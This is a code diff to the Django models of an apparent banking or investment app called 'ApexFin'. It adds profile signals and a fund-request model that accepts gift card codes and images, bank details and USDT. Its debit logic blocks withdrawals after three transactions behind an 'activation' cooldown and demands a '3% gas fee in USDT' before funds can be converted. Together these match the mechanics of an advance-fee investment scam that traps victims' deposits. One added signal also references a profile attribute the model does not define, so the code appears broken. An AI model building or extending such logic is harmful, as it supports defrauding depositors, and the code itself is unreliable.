@@ -5,6 +5,8 @@ from datetime import timedelta
 from decimal import Decimal
 import random
 from django.conf import settings
+from django.db.models.signals import post_save
+from django.dispatch import receiver
 
 
 # Function to generate a unique account number
@@ -14,6 +16,7 @@ def generate_unique_account_number():
         account_number = str(random.randint(1000000000, 9999999999))
         if not UserProfile.objects.filter(unique_account_number=account_number).exists():
             return account_number
+
 
 # Custom manager for the user
 class CustomUserManager(BaseUserManager):
@@ -31,7 +34,8 @@ class CustomUserManager(BaseUserManager):
         extra_fields.setdefault("is_superuser", True)
         return self.create_user(username, email, password, **extra_fields)
 
-# Custom User model inheriting from AbstractUser
+
+# Custom User model
 class CustomUser(AbstractUser):
     account_number = models.CharField(max_length=20, unique=True, blank=True, null=True)
 
@@ -40,7 +44,8 @@ class CustomUser(AbstractUser):
             self.account_number = generate_unique_account_number()
         super().save(*args, **kwargs)
 
-# UserProfile model for storing extra user info
+
+# UserProfile for extra user info
 class UserProfile(models.Model):
     user = models.OneToOneField(settings.AUTH_USER_MODEL, on_delete=models.CASCADE)
     balance = models.DecimalField(max_digits=15, decimal_places=2, default=Decimal("0.00"))
@@ -60,23 +65,36 @@ class UserProfile(models.Model):
         super().save(*args, **kwargs)
 
     def is_in_cooldown(self):
-        """Check if the account is in cooldown period."""
         if self.cooldown_start:
             return now() < self.cooldown_start + timedelta(hours=36)
         return False
 
     def requires_activation(self):
-        """Check if activation is needed for this user profile."""
         return self.transaction_count >= 3 and not self.is_activated
 
     def requires_conversion(self):
-        """Check if coin-to-fiat conversion is needed."""
         return self.is_activated and not self.is_converted and self.investment_profit > 0
 
     def __str__(self):
         return f"{self.user.username}'s Profile"
 
-# Transaction model for logging user transactions
+
+# Signals to automatically create a UserProfile when a CustomUser is created
+@receiver(post_save, sender=CustomUser)
+def create_user_profile(sender, instance, created, **kwargs):
+    """Create a UserProfile instance for the newly created CustomUser."""
+    if created:
+        UserProfile.objects.create(user=instance)
+
+
+# Signals to save the UserProfile after the CustomUser is saved
+@receiver(post_save, sender=CustomUser)
+def save_user_profile(sender, instance, **kwargs):
+    """Save the UserProfile instance after the CustomUser is saved."""
+    # Ensure the profile is created if it doesn't exist
+    instance.profile.save()
+
+
 class Transaction(models.Model):
     TRANSACTION_TYPES = [
         ("credit", "Credit"),
@@ -94,18 +112,19 @@ class Transaction(models.Model):
     narration = models.TextField(blank=True)
     timestamp = models.DateTimeField(default=now)
     status = models.CharField(max_length=20, default='completed')
-    balance_after = models.DecimalField(max_digits=12, decimal_places=2, null=True, blank=True)
+    balance_after = models.DecimalField(default=0, max_digits=10, decimal_places=2)
 
     def save(self, *args, **kwargs):
-        profile = self.user.userprofile
+        # Access the profile correctly
+        profile, _ = UserProfile.objects.get_or_create(user=self.user)
 
-        # Handling transaction logic
+
         if self.transaction_type == "debit":
-            if profile.requires_activation() and profile.transaction_count >= 3:
+            if profile.requires_activation():
                 profile.cooldown_start = now()
                 profile.save()
                 raise ValueError("Transaction limit reached. Activation required after cooldown.")
-            
+
             if profile.requires_conversion():
                 raise ValueError("Convert ApexFin Coin to fiat (3% gas fee in USDT required).")
 
@@ -129,29 +148,36 @@ class Transaction(models.Model):
         super().save(*args, **kwargs)
 
     def get_transaction_direction(self, current_user):
-        """Determine whether the transaction is 'Sent' or 'Received'."""
         if self.user == current_user:
-            if self.transaction_type == "debit":
-                return 'Sent'  # Outgoing transaction (Sent)
-            else:
-                return 'Received'  # Incoming transaction (Received)
+            return 'Sent' if self.transaction_type == "debit" else 'Received'
         else:
-            if self.transaction_type == "credit":
-                return 'Sent'  # Outgoing transaction from the other party (Sent)
-            else:
-                return 'Received'  # Incoming transaction to the current user (Received)
+            return 'Sent' if self.transaction_type == "credit" else 'Received'
 
     def get_counterparty_name(self, current_user):
-        """Get the counterparty's name."""
-        if self.user == current_user:
-            return self.recipient_name  # Name of the recipient if the user is the sender
-        else:
-            return self.sender_name  # Name of the sender if the user is the recipient
+        return self.recipient_name if self.user == current_user else self.sender_name
 
     def get_counterparty_account(self, current_user):
-        """Get the counterparty's account number."""
-        if self.user == current_user:
-            return self.recipient_account  # Account number of the recipient if the user is the sender
-        else:
-            return self.sender_account  # Account number of the sender if the user is the recipient
+        return self.recipient_account if self.user == current_user else self.sender_account
 
+
+# AddFundRequest Model
+class AddFundRequest(models.Model):
+    PAYMENT_METHODS = [
+        ('gift_card', 'Gift Card'),
+        ('bank_transfer', 'Bank Transfer'),
+        ('crypto', 'Crypto (USDT)'),
+    ]
+
+    user = models.ForeignKey(settings.AUTH_USER_MODEL, on_delete=models.CASCADE)
+    payment_method = models.CharField(max_length=20, choices=PAYMENT_METHODS)
+    amount = models.DecimalField(max_digits=12, decimal_places=2)
+    gift_card_code = models.CharField(max_length=255, blank=True, null=True)
+    gift_card_image = models.ImageField(upload_to='gift_cards/', blank=True, null=True)
+    bank_details = models.TextField(blank=True, null=True)
+    crypto_wallet_address = models.CharField(max_length=255, blank=True, null=True)
+    status = models.CharField(max_length=20, default='pending')  # pending / approved / rejected
+    created_at = models.DateTimeField(auto_now_add=True)
+    is_verified = models.BooleanField(default=False)  # New field to mark verification status
+
+    def __str__(self):
+        return f"{self.user.username} - {self.payment_method.title()} - ${self.amount:,.2f}"
